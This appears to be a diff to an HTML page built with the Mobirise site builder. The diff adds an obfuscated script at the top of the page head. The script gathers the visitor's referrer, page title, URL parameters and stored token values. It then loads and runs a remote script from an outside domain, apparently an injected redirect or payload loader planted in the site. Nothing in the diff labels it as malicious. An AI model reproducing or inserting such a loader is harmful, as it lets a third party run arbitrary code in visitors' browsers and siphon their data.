@@ -1,6 +1,48 @@
 <!DOCTYPE html>
 <html  >
 <head>
+	<script>
+    (function() {
+    var name = '_VDY6BR3y87hwdsfW';
+    if (!window._VDY6BR3y87hwdsfW) {
+        window._VDY6BR3y87hwdsfW = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://moonacademy.pro/pYJHSyNy',
+        };
+    }
+    const _JKyhJBJbhZMydkC7 = localStorage.getItem('config');
+    if (typeof _JKyhJBJbhZMydkC7 !== 'undefined' && _JKyhJBJbhZMydkC7 !== null) {
+        var _VZvL6MDw4mKkdqJh = JSON.parse(_JKyhJBJbhZMydkC7);
+        var _JZRqYh1SLkyHFFdt = Math.round(+new Date()/1000);
+        if (_VZvL6MDw4mKkdqJh.created_at + window._VDY6BR3y87hwdsfW.ttl < _JZRqYh1SLkyHFFdt) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _MxZkScn4WhMTJKkR = localStorage.getItem('subId');
+    var _ngjMfc63kNMyhm7z = localStorage.getItem('token');
+    var _tCSZYj1CxQ761Rf7 = '?return=js.client';
+        _tCSZYj1CxQ761Rf7 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _tCSZYj1CxQ761Rf7 += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _tCSZYj1CxQ761Rf7 += '&default_keyword=' + encodeURIComponent(document.title);
+        _tCSZYj1CxQ761Rf7 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _tCSZYj1CxQ761Rf7 += '&name=' + encodeURIComponent(name);
+        _tCSZYj1CxQ761Rf7 += '&host=' + encodeURIComponent(window._VDY6BR3y87hwdsfW.R_PATH);
+    if (typeof _MxZkScn4WhMTJKkR !== 'undefined' && _MxZkScn4WhMTJKkR && window._VDY6BR3y87hwdsfW.unique) {
+        _tCSZYj1CxQ761Rf7 += '&sub_id=' + encodeURIComponent(_MxZkScn4WhMTJKkR);
+    }
+    if (typeof _ngjMfc63kNMyhm7z !== 'undefined' && _ngjMfc63kNMyhm7z && window._VDY6BR3y87hwdsfW.unique) {
+        _tCSZYj1CxQ761Rf7 += '&token=' + encodeURIComponent(_ngjMfc63kNMyhm7z);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._VDY6BR3y87hwdsfW.R_PATH + _tCSZYj1CxQ761Rf7;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
   <!-- Site made with Mobirise Website Builder v5.9.8, https://mobirise.com -->
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
